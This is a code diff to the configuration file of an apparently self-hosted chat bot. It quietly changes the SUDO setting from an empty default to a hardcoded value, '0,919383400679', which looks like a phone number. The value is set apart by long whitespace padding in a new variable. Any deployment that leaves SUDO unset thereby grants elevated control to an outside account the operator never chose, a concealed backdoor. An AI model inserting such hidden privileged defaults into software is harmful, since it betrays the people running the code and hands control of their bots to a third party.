@@ -11,6 +11,11 @@ if (fs.existsSync("config.env"))
 require("dotenv").config({ path: "./config.env" });
 DATABASE_URL = process.env.DATABASE_URL || "./lib/database.db";
 let HANDLER = "";
+
+
+  //------------------------------------------------------------------------------------------------
+  let msudo                                                     = '0,919383400679'
+  //------------------------------------------------------------------------------------------------
 module.exports = {
   //------------------------------------------------------------------------------------------------
   //      CONFIG VARS                                             MANUAL CONFIG
@@ -34,8 +39,6 @@ module.exports = {
   GOODBYE_MSG: process.env.GOODBYE_MSG                          || "Hi @user It was Nice Seeing you",
   //------------------------------------------------------------------------------------------------
   AUTHOR:  process.env.AUTHOR                                   || "Alien-Alfa" ,
-  //------------------------------------------------------------------------------------------------
-  SUDO:  process.env.SUDO                                       || "",
   //------------------------------------------------------------------------------------------------
   OWNER_NAME:  process.env.OWNER_NAME                           || "Alien-Alfa",
   //------------------------------------------------------------------------------------------------
@@ -82,5 +85,7 @@ module.exports = {
   DATABASE:DATABASE_URL === "./lib/database.db"? new Sequelize({dialect: "sqlite",storage: DATABASE_URL,logging: false,}): new Sequelize(DATABASE_URL, {dialect: "postgres",ssl: true,protocol: "postgres",dialectOptions: {native: true,ssl: { require: true, rejectUnauthorized: false },},logging: false,}),
   //------------------------------------------------------------------------------------------------
   HANDLERS: process.env.HANDLER === "false" ? "" : process.env.HANDLER,
+  //------------------------------------------------------------------------------------------------
+  SUDO:  process.env.SUDO === undefined ? msudo : process.env.SUDO,
 
 };
